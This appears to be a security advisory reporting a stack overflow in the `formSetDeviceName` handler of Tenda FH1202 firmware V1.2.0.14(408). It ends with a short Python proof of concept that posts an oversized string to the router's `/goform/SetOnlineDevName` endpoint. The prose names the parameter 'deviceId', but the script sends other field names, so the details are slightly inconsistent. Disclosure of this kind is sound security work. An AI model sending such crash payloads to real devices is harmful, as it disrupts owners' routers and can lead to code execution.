## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2079.html

## Affected version

FH1202 V1.2.0.14(408)

## Vulnerability details

The Tenda FH1202 V1.2.0.14(408) firmware has a stack overflow vulnerability in the `formSetDeviceName` function. The `v4` variable receives the `deviceId` parameter from a POST request. The value is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided `deviceId` can trigger this security vulnerability.

![image-20240319231037757](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319231037757.png)

![image-20240319231029213](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319231029213.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetOnlineDevName"
payload = b"a"*1000

data = {"d": payload,"devName": 1}
response = requests.post(url, data=data)
print(response.text)
```

![](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319231402982.png)
